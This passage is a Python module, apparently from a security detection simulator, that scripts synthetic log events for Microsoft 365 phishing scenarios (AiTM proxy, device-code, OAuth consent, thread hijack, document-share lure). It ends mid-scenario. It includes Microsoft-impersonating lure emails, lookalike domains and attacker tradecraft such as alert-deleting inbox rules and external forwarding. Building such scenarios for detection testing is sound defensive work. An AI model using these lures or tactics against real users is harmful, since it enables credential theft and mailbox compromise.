"""
Extended attack scenarios from the Legion attack catalog (IDs 002-104).

This module defines attack scenario templates covering:
- Social engineering (AiTM, device-code, OAuth consent, thread hijack, BEC, etc.)
- Identity persistence (MFA registration, mailbox rules, service principals, etc.)
- Endpoint attacks (ISO/LNK, DLL sideloading, RAT, credential stealers, etc.)
- AD/hybrid identity (Kerberoasting, DCSync, golden ticket, GPO abuse, etc.)
- Cloud/SaaS (service discovery, vault theft, logging suppression, cryptomining, etc.)
- Data theft/DevOps (repo theft, DNS exfil, poisoned pipelines, container attacks, etc.)
- Compound T3 campaigns (multi-stage attack chains)
"""
from __future__ import annotations

from .scenarios import AttackScenario, AttackEvent, _delay, SHARED_ATTACKER_INFRA


# =============================================================================
# SOCIAL ENGINEERING SCENARIOS
# =============================================================================

AITM_PHISHING_PARAMS = {
    "attacker_domains": ["login-secure-m365.com", "auth-office365-proxy.net", "microsoftonline-auth-relay.com", "secure-login-portal.net"],
    "sender_names": ["Microsoft 365", "IT Security Team", "Microsoft Account Team"],
    "sender_prefixes": ["security", "no-reply", "notifications", "mfa-alert"],
    "subjects": [
        "Action Required: Verify Your Identity to Continue",
        "Unusual Sign-in Activity Detected on Your Account",
        "Your Microsoft 365 Session Has Expired — Re-authenticate",
    ],
    "email_bodies": [
        "We detected suspicious activity on your account.\n\nFor your protection, you must re-verify your identity:\n{phishing_url}\n\nThis link expires in 30 minutes.\n\nMicrosoft Security Team",
    ],
    "evilginx_domains": SHARED_ATTACKER_INFRA["evilginx_domains"],
    "attacker_geos": SHARED_ATTACKER_INFRA["attacker_geos"],
    "attacker_ip_ranges": SHARED_ATTACKER_INFRA["c2_ips"],
    "attacker_user_agents": SHARED_ATTACKER_INFRA["attacker_user_agents"],
    "phishing_domains": ["login-secure-m365.com", "auth-office365-proxy.net"],
}

AITM_PHISHING = AttackScenario(
    id="aitm_phishing",
    tier="T2",
    name="AiTM Phishing — Session Token Theft via Reverse Proxy",
    description="Attacker deploys reverse proxy between victim and real login page. Victim authenticates normally including MFA while proxy captures session cookie. Attacker replays stolen session from foreign IP, registers new MFA device for persistence, searches mailbox for sensitive content, creates inbox rules to hide traces, and sets up mail forwarding for ongoing access.",
    attack_type="phishing",
    events=[
        # --- Phase 1: Delivery — phishing email ---
        AttackEvent(event_type="email", delay=_delay(0, 0), data={"direction": "received", "from": "{attacker_email}", "subject": "{subject}", "content": "{email_body}", "external": True, "contains_url": "{phishing_url}", "metadata": {"is_malicious": True, "attack_phase": "delivery", "lure_type": "aitm_proxy"}}, requires_success=False),

        # --- Phase 2: Exploitation — victim clicks link and is redirected through proxy ---
        AttackEvent(event_type="app_event", delay=_delay(18, 12, 2, 90), data={"app": "Outlook", "action": "open_url", "resource_name": "{phishing_url}", "success": True, "description": "User clicked AiTM proxy link", "metadata": {"attack_phase": "exploitation"}}, requires_success=True, on_failure={"event_type": "app_event", "delay": _delay(8, 4, 1, 30), "data": {"app": "Outlook", "action": "report_phishing", "description": "User reported suspicious email", "success": True}}),
        AttackEvent(event_type="app_event", delay=_delay(0.5, 0.3, 0.1, 2), data={"app": "Microsoft Edge", "action": "navigate", "resource_name": "{evilginx_domain}", "success": True, "description": "Browser redirected to evilginx reverse proxy", "metadata": {"attack_phase": "exploitation"}}, requires_success=True),

        # --- Phase 3: Credential capture — victim authenticates through proxy ---
        AttackEvent(event_type="login", delay=_delay(3, 1.5, 0.5, 10), data={"success": True, "method": "Password+MFA", "known_device": True, "metadata": {"attack_phase": "credential_capture", "session_token_stolen": True}}, requires_success=True),

        # --- Phase 4: Session replay — attacker extracts cookie and replays from foreign IP ---
        AttackEvent(event_type="login", delay=_delay(35, 20, 5, 90), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "SessionToken", "metadata": {"attack_phase": "unauthorized_access", "is_attacker": True, "session_replay": True, "impossible_travel": True}}, requires_success=True),

        # --- Phase 5: Persistence — register new MFA device before session expires ---
        AttackEvent(event_type="admin_action", delay=_delay(5, 3, 1, 15), data={"system": "azure_ad", "approved_by": "self", "action": "register_mfa_device", "resource_type": "authentication_method", "resource_id": "mfa_totp_authenticator", "resource_name": "Microsoft Authenticator", "success": True, "description": "New Authenticator app registered from attacker session", "metadata": {"attack_phase": "persistence", "is_attacker": True, "mfa_manipulation": True}}, requires_success=True),

        # --- Phase 6: Reconnaissance — browse portal and search mailbox ---
        AttackEvent(event_type="app_event", delay=_delay(20, 10, 5, 60), data={"app": "Microsoft 365", "action": "access_dashboard", "resource_name": "M365 Admin Portal", "success": True, "description": "Attacker accessed M365 portal with stolen session", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(10, 5, 2, 30), data={"app": "Outlook Web Access", "action": "search_mailbox", "resource_type": "mailbox", "resource_name": "Inbox Search: 'password OR confidential OR wire transfer OR credentials'", "success": True, "description": "Attacker searched mailbox for sensitive keywords", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "Outlook Web Access", "action": "read_email", "resource_type": "email", "resource_name": "Re: VPN Access Credentials — New Joiner Setup", "success": True, "description": "Attacker read email containing VPN credentials", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),

        # --- Phase 7: Defense evasion — inbox rule to suppress alerts ---
        AttackEvent(event_type="app_event", delay=_delay(15, 8, 3, 45), data={"app": "Outlook Web Access", "action": "create_inbox_rule", "resource_type": "inbox_rule", "resource_id": "rule_auto_delete_alerts", "resource_name": "Auto-Delete Security Alerts", "success": True, "description": "Inbox rule created to auto-delete emails containing 'security alert' or 'unusual sign-in'", "metadata": {"attack_phase": "defense_evasion", "is_attacker": True}}, requires_success=True),

        # --- Phase 8: Persistence — mail forwarding for ongoing access ---
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "Exchange Online", "action": "create_inbox_rule", "resource_type": "inbox_rule", "resource_id": "rule_auto_forward", "resource_name": "Auto-Forward to External", "success": True, "description": "Mailbox forwarding rule created to external address", "metadata": {"attack_phase": "persistence", "is_attacker": True, "external_forwarding": True}}, requires_success=True),

        # --- Phase 9: Network indicator — attacker session traffic ---
        AttackEvent(event_type="network_event", delay=_delay(3, 2, 0.5, 10), data={"source_ip": "{attacker_ip}", "destination_ip": "52.96.0.40", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "user": "{victim_username}", "auth": "none", "bytes_sent": 524288, "bytes_received": 2097152, "description": "Sustained HTTPS session to M365 from foreign IP — mailbox and portal access"}, requires_success=True),
    ],
    parameters=AITM_PHISHING_PARAMS,
    success_rate=0.65,
    iocs=["login-secure-m365.com", "auth-office365-proxy.net", "login-secure-portal.com"],
    expected_findings=[
        "Phishing email with AiTM reverse proxy link",
        "Impossible travel: attacker session replay from foreign IP minutes after victim login",
        "New MFA device registered from attacker session",
        "Inbox rule deleting security alert emails",
        "Mail forwarding rule to external address",
    ],
    relevant_ioc_keys=["attacker_email", "phishing_url", "evilginx_domain", "attacker_ip", "attacker_geo"],
)


DEVICE_CODE_PHISHING_PARAMS = {
    "attacker_domains": ["device-verification-portal.com", "microsoft-device-code.net", "account-activation-center.com"],
    "sender_names": ["Microsoft Teams", "IT Help Desk", "Microsoft Azure"],
    "sender_prefixes": ["teams", "notifications", "no-reply", "helpdesk"],
    "subjects": ["Action Required: Activate Your New Device", "Complete Device Registration for Compliance", "Teams: New Device Authorization Needed"],
    "email_bodies": ["To activate your new device, enter the following code at https://microsoft.com/devicelogin:\n\nDevice Code: {device_code}\n\nThis code expires in 15 minutes.\n\nIT Security Team"],
    "device_codes": ["BXWP-KMLQ", "FCTZ-NRVD", "HJMQ-SPWK", "KLNB-XQFV"],
    "attacker_geos": SHARED_ATTACKER_INFRA["attacker_geos"],
    "attacker_ip_ranges": SHARED_ATTACKER_INFRA["c2_ips"],
    "attacker_user_agents": SHARED_ATTACKER_INFRA["attacker_user_agents"],
}

DEVICE_CODE_PHISHING = AttackScenario(
    id="device_code_phishing",
    tier="T2",
    name="Device Code Phishing — OAuth Token Hijack",
    description="Attacker initiates Device Code OAuth flow, sends code to victim via email. Victim enters code at legitimate microsoft.com/devicelogin, unknowingly granting attacker persistent token access. Attacker uses the token to browse M365 admin portal, search the victim's mailbox for sensitive content, read confidential emails, register a new MFA device for persistence, create an inbox forwarding rule to maintain access, and generate suspicious network traffic from a foreign IP.",
    attack_type="phishing",
    events=[
        # --- Phase 1: Delivery — device code phishing email ---
        AttackEvent(event_type="email", delay=_delay(0, 0), data={"direction": "received", "from": "{attacker_email}", "subject": "{subject}", "content": "{email_body}", "external": True, "contains_url": "https://microsoft.com/devicelogin", "metadata": {"is_malicious": True, "attack_phase": "delivery", "device_code": "{device_code}"}}, requires_success=False),

        # --- Phase 2: Exploitation — victim enters device code at legitimate Microsoft page ---
        AttackEvent(event_type="app_event", delay=_delay(12, 8, 1, 60), data={"app": "Microsoft Edge", "action": "navigate", "resource_name": "https://microsoft.com/devicelogin", "success": True, "description": "User navigated to device login page", "metadata": {"attack_phase": "exploitation"}}, requires_success=True, on_failure={"event_type": "app_event", "delay": _delay(10, 5, 1, 40), "data": {"app": "Outlook", "action": "report_phishing", "description": "User reported suspicious device code email", "success": True}}),
        AttackEvent(event_type="login", delay=_delay(1.5, 0.8, 0.2, 5), data={"success": True, "known_device": True, "method": "device_code", "metadata": {"attack_phase": "credential_capture", "device_code_auth": True, "token_granted_to": "attacker_device"}}, requires_success=True),

        # --- Phase 3: Token replay — attacker uses granted token from foreign IP ---
        AttackEvent(event_type="login", delay=_delay(3, 2, 0.5, 15), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "device_code", "metadata": {"attack_phase": "unauthorized_access", "is_attacker": True, "oauth_token_replay": True}}, requires_success=True),

        # --- Phase 4: Discovery — browse M365 admin portal ---
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "Microsoft 365", "action": "access_dashboard", "resource_name": "M365 Admin Portal — Users, Groups, Licenses", "success": True, "description": "Attacker browsed M365 admin portal to enumerate tenant resources", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),

        # --- Phase 5: Collection — mailbox keyword search and email reading ---
        AttackEvent(event_type="app_event", delay=_delay(8, 4, 2, 20), data={"app": "Outlook Web Access", "action": "search_mailbox", "resource_type": "mailbox", "resource_name": "Inbox Search: 'password OR secret OR API key OR credentials OR wire transfer'", "success": True, "description": "Attacker searched mailbox for sensitive keywords using device code token", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 12), data={"app": "Outlook Web Access", "action": "read_email", "resource_type": "email", "resource_name": "Re: AWS Root Account Credentials — Emergency Access", "success": True, "description": "Attacker read email containing cloud infrastructure credentials", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 8), data={"app": "Outlook Web Access", "action": "read_email", "resource_type": "email", "resource_name": "FW: Q4 Board Presentation — Confidential Draft", "success": True, "description": "Attacker read confidential board presentation email", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),

        # --- Phase 6: Persistence — register MFA device before token expires ---
        AttackEvent(event_type="admin_action", delay=_delay(10, 5, 2, 25), data={"system": "azure_ad", "approved_by": "self", "action": "register_mfa_device", "resource_type": "authentication_method", "resource_id": "mfa_totp_authenticator", "resource_name": "Microsoft Authenticator", "success": True, "description": "New Authenticator app registered from attacker session for persistent access", "metadata": {"attack_phase": "persistence", "is_attacker": True, "mfa_manipulation": True}}, requires_success=True),

        # --- Phase 7: Defense evasion — inbox forwarding rule ---
        AttackEvent(event_type="app_event", delay=_delay(8, 4, 2, 20), data={"app": "Exchange Online", "action": "create_inbox_rule", "resource_type": "inbox_rule", "resource_id": "rule_auto_forward", "resource_name": "Auto-Forward to External", "success": True, "description": "Inbox forwarding rule created to external address for ongoing email monitoring", "metadata": {"attack_phase": "persistence", "is_attacker": True, "external_forwarding": True}}, requires_success=True),

        # --- Phase 8: Network indicator — attacker session traffic ---
        AttackEvent(event_type="network_event", delay=_delay(3, 2, 0.5, 10), data={"source_ip": "{attacker_ip}", "destination_ip": "52.96.0.40", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "user": "{victim_username}", "auth": "none", "bytes_sent": 262144, "bytes_received": 1048576, "description": "Sustained HTTPS session to M365 from foreign IP — device code token used for portal, mailbox, and admin access"}, requires_success=True),
    ],
    parameters=DEVICE_CODE_PHISHING_PARAMS,
    success_rate=0.6,
    iocs=["device-verification-portal.com", "microsoft-device-code.net"],
    expected_findings=[
        "Email lure with device code instructions pointing to legitimate microsoft.com/devicelogin",
        "Impossible travel: attacker token replay from foreign IP seconds after victim auth",
        "New MFA device registered from attacker session for persistence",
        "Inbox forwarding rule to external address created",
    ],
    relevant_ioc_keys=["attacker_email", "attacker_ip", "attacker_geo"],
)


OAUTH_CONSENT_PHISHING_PARAMS = {
    "attacker_domains": ["azure-app-marketplace.com", "m365-trusted-app.net", "office365-connector-hub.com"],
    "sender_names": ["Microsoft AppSource", "IT Operations Team"],
    "sender_prefixes": ["appsource", "no-reply", "it-ops"],
    "malicious_app_names": ["DocumentSync Pro", "SecureBackup365", "TeamsMigrationTool", "ComplianceAuditApp"],
    "malicious_app_ids": ["a1b2c3d4-e5f6-7890-abcd-ef1234567890", "b2c3d4e5-f6a7-8901-bcde-f12345678901"],
    "subjects": ["New Productivity App Available: {malicious_app_name}", "IT has shared a required tool: {malicious_app_name}"],
    "email_bodies": ["IT Operations has deployed a new productivity tool.\n\nAuthorize {malicious_app_name}:\n{phishing_url}\n\nThis app requires access to mail and files."],
    "phishing_domains": ["azure-app-marketplace.com", "m365-trusted-app.net"],
    "attacker_geos": SHARED_ATTACKER_INFRA["attacker_geos"],
    "attacker_ip_ranges": SHARED_ATTACKER_INFRA["c2_ips"],
    "attacker_user_agents": SHARED_ATTACKER_INFRA["attacker_user_agents"],
}

OAUTH_CONSENT_PHISHING = AttackScenario(
    id="oauth_consent_phishing",
    tier="T2",
    name="OAuth Consent Phishing — Malicious App Authorization",
    description="Attacker tricks victim into authorizing malicious OAuth app, granting delegated Graph API permissions. The app reads mailbox content searching for sensitive keywords, accesses calendar events and contacts, downloads OneDrive files, forwards sensitive data externally, and establishes persistence by adding a client secret to a service principal.",
    attack_type="phishing",
    events=[
        # --- Phase 1: Delivery — phishing email with OAuth consent link ---
        AttackEvent(event_type="email", delay=_delay(0, 0), data={"direction": "received", "from": "{attacker_email}", "subject": "{subject}", "content": "{email_body}", "external": True, "contains_url": "{phishing_url}", "metadata": {"is_malicious": True, "attack_phase": "delivery", "lure_type": "oauth_consent"}}, requires_success=False),

        # --- Phase 2: Exploitation — victim clicks link and grants consent ---
        AttackEvent(event_type="app_event", delay=_delay(20, 14, 2, 120), data={"app": "Microsoft Edge", "action": "navigate", "resource_name": "{phishing_url}", "success": True, "description": "User clicked OAuth consent link", "metadata": {"attack_phase": "exploitation"}}, requires_success=True, on_failure={"event_type": "app_event", "delay": _delay(10, 6, 1, 60), "data": {"app": "Outlook", "action": "report_phishing", "description": "User reported suspicious app request", "success": True}}),
        AttackEvent(event_type="app_event", delay=_delay(1, 0.5, 0.2, 4), data={"app": "Microsoft 365", "action": "consent_grant", "resource_name": "{malicious_app_name}", "success": True, "description": "User granted OAuth consent to malicious app with Mail.Read, Calendars.Read, Contacts.Read, Files.Read.All scopes", "metadata": {"attack_phase": "credential_capture", "oauth_consent_granted": True, "delegated_scopes": "Mail.Read Calendars.Read Contacts.Read Files.Read.All"}}, requires_success=True),

        # --- Phase 3: Collection — malicious app uses Graph API to read mailbox ---
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 15), data={"app": "{malicious_app_name}", "action": "search_mailbox", "resource_type": "mailbox", "resource_name": "Graph API: /me/messages?$search='password OR confidential OR wire transfer OR invoice'", "success": True, "description": "Malicious app searched mailbox via Graph API for sensitive keywords", "metadata": {"attack_phase": "collection", "is_attacker": True, "graph_api_call": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 12), data={"app": "{malicious_app_name}", "action": "read_email", "resource_type": "email", "resource_name": "Graph API: /me/messages/{msg_id} — Re: Wire Transfer Instructions for Q4 Vendor Payment", "success": True, "description": "Malicious app read email containing wire transfer details via Graph API", "metadata": {"attack_phase": "collection", "is_attacker": True, "graph_api_call": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 8), data={"app": "{malicious_app_name}", "action": "read_email", "resource_type": "email", "resource_name": "Graph API: /me/messages/{msg_id} — FW: VPN and Remote Access Credentials", "success": True, "description": "Malicious app read email containing VPN credentials via Graph API", "metadata": {"attack_phase": "collection", "is_attacker": True, "graph_api_call": True}}, requires_success=True),

        # --- Phase 4: Collection — calendar and contacts enumeration ---
        AttackEvent(event_type="app_event", delay=_delay(8, 4, 2, 20), data={"app": "{malicious_app_name}", "action": "read_calendar", "resource_type": "calendar", "resource_name": "Graph API: /me/calendarView — retrieved 45 events including 'Board Meeting', 'M&A Discussion', 'Quarterly Earnings Review'", "success": True, "description": "Malicious app read calendar events via Graph API to map organizational activities", "metadata": {"attack_phase": "collection", "is_attacker": True, "graph_api_call": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 12), data={"app": "{malicious_app_name}", "action": "list_contacts", "resource_type": "contacts", "resource_name": "Graph API: /me/contacts — enumerated 128 contacts including executives and external partners", "success": True, "description": "Malicious app listed all contacts via Graph API", "metadata": {"attack_phase": "collection", "is_attacker": True, "graph_api_call": True}}, requires_success=True),

        # --- Phase 5: Collection — OneDrive file access ---
        AttackEvent(event_type="app_event", delay=_delay(10, 5, 2, 25), data={"app": "{malicious_app_name}", "action": "list_files", "resource_type": "drive", "resource_name": "Graph API: /me/drive/root/children — enumerated OneDrive root folder", "success": True, "description": "Malicious app enumerated OneDrive files via Graph API", "metadata": {"attack_phase": "collection", "is_attacker": True, "graph_api_call": True}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(5, 3, 1, 12), data={"action": "download", "path": "Graph API: /me/drive/items/{item_id}/content — Confidential_Strategy_2027.pptx", "system": "onedrive", "label": "confidential", "category": "strategic", "description": "Malicious app downloaded confidential strategy document from OneDrive via Graph API", "metadata": {"attack_phase": "exfiltration", "is_attacker": True, "graph_api_call": True}}, requires_success=True),

        # --- Phase 6: Exfiltration — forward sensitive data to attacker-controlled endpoint ---
        AttackEvent(event_type="app_event", delay=_delay(8, 4, 2, 20), data={"app": "{malicious_app_name}", "action": "send_email", "resource_type": "email", "resource_name": "Graph API: /me/sendMail — forwarded 12 sensitive emails to external address", "success": True, "description": "Malicious app used Graph API to forward sensitive emails to attacker-controlled external address", "metadata": {"attack_phase": "exfiltration", "is_attacker": True, "graph_api_call": True, "external_forwarding": True}}, requires_success=True),

        # --- Phase 7: Persistence — add client secret to service principal ---
        AttackEvent(event_type="app_event", delay=_delay(12, 6, 3, 30), data={"app": "Azure AD", "action": "add_service_principal_secret", "resource_type": "service_principal", "resource_id": "{malicious_app_id}", "resource_name": "Service Principal: {malicious_app_name} — new client secret added for persistent API access", "success": True, "description": "Attacker added client secret to service principal for persistent Graph API access without user token", "metadata": {"attack_phase": "persistence", "is_attacker": True, "service_principal_manipulation": True}}, requires_success=True),
    ],
    parameters=OAUTH_CONSENT_PHISHING_PARAMS,
    success_rate=0.6,
    iocs=["azure-app-marketplace.com", "m365-trusted-app.net"],
    expected_findings=[
        "OAuth consent granted to unknown third-party app with broad permissions (Mail, Calendar, Contacts, Files)",
        "Malicious app accessed mailbox and files via Graph API",
        "OneDrive files enumerated and confidential documents downloaded via Graph API",
        "Client secret added to service principal for persistent API access",
    ],
    relevant_ioc_keys=["attacker_email", "phishing_url", "attacker_ip", "malicious_app_name", "malicious_app_id"],
)


THREAD_HIJACK_PARAMS = {
    "attacker_domains": ["sharepoint-document-share.com", "onedrive-secure-view.net", "teams-file-share.com"],
    "sender_names": ["Colleague"], "sender_prefixes": ["noreply"],
    "evilginx_domains": SHARED_ATTACKER_INFRA["evilginx_domains"],
    "hijacked_thread_subjects": ["Re: Q4 Budget Review — Final Numbers", "Re: Vendor Contract Renewal", "Re: Team Offsite Planning", "Re: Project Milestone Sign-off"],
    "hijack_lure_bodies": ["Just following up — I've posted the latest version for your review:\n{phishing_url}\n\nThanks"],
    "phishing_domains": ["sharepoint-document-share.com", "onedrive-secure-view.net"],
    "attacker_geos": SHARED_ATTACKER_INFRA["attacker_geos"],
    "attacker_ip_ranges": SHARED_ATTACKER_INFRA["c2_ips"],
    "attacker_user_agents": SHARED_ATTACKER_INFRA["attacker_user_agents"],
}

THREAD_HIJACK = AttackScenario(
    id="thread_hijack",
    tier="T2",
    name="Email Thread Hijacking — Trusted Reply Lure",
    description="Attacker first accesses a compromised peer's mailbox to find trusted email threads, then searches for high-value conversations to hijack. The attacker crafts a reply inside an existing legitimate thread from the peer's mailbox with a credential harvest link. When the second victim clicks and submits credentials, the attacker logs in from a foreign IP, searches the new victim's mailbox for sensitive content, reads confidential emails, and accesses shared documents.",
    attack_type="phishing",
    events=[
        # --- Phase 1: Recon — attacker accesses compromised peer's mailbox ---
        AttackEvent(event_type="login", delay=_delay(0, 0), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Password", "metadata": {"attack_phase": "initial_access", "is_attacker": True, "accessing_compromised_peer": True}}, requires_success=False),
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "Outlook Web Access", "action": "search_mailbox", "resource_type": "mailbox", "resource_name": "Peer Inbox Search: 'budget OR contract OR sign-off OR vendor OR project'", "success": True, "description": "Attacker searched compromised peer mailbox for trusted threads to hijack", "metadata": {"attack_phase": "reconnaissance", "is_attacker": True, "compromised_peer_mailbox": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 10), data={"app": "Outlook Web Access", "action": "read_email", "resource_type": "email", "resource_name": "Re: Q4 Budget Review — Final Numbers (thread with victim)", "success": True, "description": "Attacker read existing thread between peer and victim to craft convincing reply", "metadata": {"attack_phase": "reconnaissance", "is_attacker": True, "thread_selected_for_hijack": True}}, requires_success=True),

        # --- Phase 2: Delivery — attacker sends hijacked thread reply from peer's mailbox ---
        AttackEvent(event_type="email", delay=_delay(10, 5, 2, 30), data={"direction": "received", "from": "{compromised_peer_email}", "subject": "{hijacked_thread_subject}", "content": "{hijack_lure_body}", "external": False, "contains_url": "{phishing_url}", "metadata": {"is_malicious": True, "attack_phase": "delivery", "lure_type": "thread_hijack", "compromised_sender": True}}, requires_success=False),

        # --- Phase 3: Exploitation — second victim clicks link and submits credentials ---
        AttackEvent(event_type="app_event", delay=_delay(12, 9, 1, 60), data={"app": "Outlook", "action": "open_url", "resource_name": "{phishing_url}", "success": True, "description": "Victim clicked link in hijacked thread reply", "metadata": {"attack_phase": "exploitation"}}, requires_success=True, on_failure={"event_type": "app_event", "delay": _delay(5, 3, 1, 20), "data": {"app": "Outlook", "action": "forward_email", "description": "User forwarded suspicious link to IT", "success": True}}),
        AttackEvent(event_type="app_event", delay=_delay(0.5, 0.3, 0.1, 2), data={"app": "Microsoft Edge", "action": "navigate", "resource_name": "{evilginx_domain}", "success": True, "description": "Browser redirected to credential capture page", "metadata": {"attack_phase": "exploitation"}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(2, 1, 0.3, 6), data={"app": "Microsoft Edge", "action": "form_submit", "resource_name": "{evilginx_domain}", "success": True, "description": "Victim entered credentials on attacker-controlled page", "metadata": {"attack_phase": "credential_capture"}}, requires_success=True),

        # --- Phase 4: Second victim compromise — attacker logs in as new victim ---
        AttackEvent(event_type="login", delay=_delay(20, 15, 3, 120), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Password", "metadata": {"attack_phase": "unauthorized_access", "is_attacker": True}}, requires_success=True),

        # --- Phase 5: Collection — search and read second victim's mailbox ---
        AttackEvent(event_type="app_event", delay=_delay(8, 4, 2, 20), data={"app": "Outlook Web Access", "action": "search_mailbox", "resource_type": "mailbox", "resource_name": "Inbox Search: 'confidential OR password OR credentials OR bank account OR wire'", "success": True, "description": "Attacker searched second victim's mailbox for sensitive keywords", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 12), data={"app": "Outlook Web Access", "action": "read_email", "resource_type": "email", "resource_name": "Re: Vendor Payment Details — Updated Bank Account", "success": True, "description": "Attacker read email containing vendor payment bank details", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 8), data={"app": "Outlook Web Access", "action": "read_email", "resource_type": "email", "resource_name": "FW: Employee Salary Review — Confidential", "success": True, "description": "Attacker read confidential salary review email", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),

        # --- Phase 6: Data access — SharePoint document download ---
        AttackEvent(event_type="file_event", delay=_delay(10, 5, 2, 25), data={"action": "download", "path": "https://company.sharepoint.com/sites/Finance/Shared Documents/Vendor-Payment-Schedule.xlsx", "system": "sharepoint", "label": "confidential", "category": "financial", "description": "Attacker downloaded vendor payment schedule from Finance SharePoint", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
    ],
    parameters=THREAD_HIJACK_PARAMS,
    success_rate=0.75,
    iocs=["sharepoint-document-share.com", "onedrive-secure-view.net", "login-secure-portal.com"],
    expected_findings=[
        "Phishing reply sent inside existing trusted thread from compromised peer",
        "Second victim clicked link and submitted credentials to attacker-controlled page",
        "Attacker login from foreign IP using second victim's stolen credentials",
        "Confidential financial documents downloaded from SharePoint",
    ],
    relevant_ioc_keys=["phishing_url", "evilginx_domain", "attacker_ip"],
)


SHARED_DOCUMENT_LURE_PARAMS = {
    "attacker_domains": ["onedrive-sharelink.com", "sharepoint-external-share.net", "document-share-notification.com"],
    "sender_names": ["OneDrive", "SharePoint", "Microsoft OneDrive"],
    "sender_prefixes": ["noreply", "sharing", "notifications"],
    "phishing_domains": ["onedrive-sharelink.com", "sharepoint-external-share.net"],
    "subjects": ["{sender_name} shared 'Q4 Financial Summary.xlsx' with you", "Document Shared: Updated Org Chart.pptx"],
    "email_bodies": ["A file has been shared with you.\n\nClick here to view: {phishing_url}\n\nThis link will expire in 7 days."],
    "attacker_geos": SHARED_ATTACKER_INFRA["attacker_geos"],
    "attacker_ip_ranges": SHARED_ATTACKER_INFRA["c2_ips"],
    "attacker_user_agents": SHARED_ATTACKER_INFRA["attacker_user_agents"],
}

SHARED_DOCUMENT_LURE = AttackScenario(
    id="shared_document_lure",
    tier="T2",
    name="Cloud Document Share Notification Lure",
    description="Fake OneDrive/SharePoint sharing notification redirects victim to credential phishing page. Attacker uses stolen credentials to log in from a foreign IP, browses the victim's mailbox for sensitive content, accesses SharePoint and OneDrive to download confidential files, and sets up a mail forwarding rule for persistent email access.",
    attack_type="phishing",
    events=[
        # --- Phase 1: Delivery — phishing email mimicking document share ---
        AttackEvent(event_type="email", delay=_delay(0, 0), data={"direction": "received", "from": "{attacker_email}", "subject": "{subject}", "content": "{email_body}", "external": True, "contains_url": "{phishing_url}", "metadata": {"is_malicious": True, "attack_phase": "delivery"}}, requires_success=False),

        # --- Phase 2: Exploitation — victim clicks and submits credentials ---
        AttackEvent(event_type="app_event", delay=_delay(22, 15, 2, 120), data={"app": "Outlook", "action": "open_url", "resource_name": "{phishing_url}", "success": True, "description": "User clicked View Document link", "metadata": {"attack_phase": "exploitation"}}, requires_success=True, on_failure={"event_type": "app_event", "delay": _delay(5, 3, 1, 30), "data": {"app": "Outlook", "action": "delete_email", "description": "User deleted suspicious notification", "success": True}}),
        AttackEvent(event_type="app_event", delay=_delay(1.5, 0.8, 0.3, 5), data={"app": "Microsoft Edge", "action": "form_submit", "resource_name": "{phishing_domain}", "success": True, "description": "Victim submitted credentials on fake sign-in page", "metadata": {"attack_phase": "credential_capture"}}, requires_success=True),

        # --- Phase 3: Session replay — attacker uses stolen creds ---
        AttackEvent(event_type="login", delay=_delay(60, 30, 10, 180), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Password", "metadata": {"attack_phase": "unauthorized_access", "is_attacker": True}}, requires_success=True),

        # --- Phase 4: Reconnaissance — mailbox and tenant exploration ---
        AttackEvent(event_type="app_event", delay=_delay(15, 8, 3, 40), data={"app": "Outlook Web Access", "action": "search_mailbox", "resource_type": "mailbox", "resource_name": "Inbox Search: 'confidential OR password OR credentials OR budget'", "success": True, "description": "Attacker searched mailbox for sensitive keywords", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(10, 5, 2, 25), data={"app": "Outlook Web Access", "action": "read_email", "resource_type": "email", "resource_id": "msg_vpn_creds", "resource_name": "Re: VPN Access — Temporary Credentials", "success": True, "description": "Attacker read email containing temporary VPN credentials", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
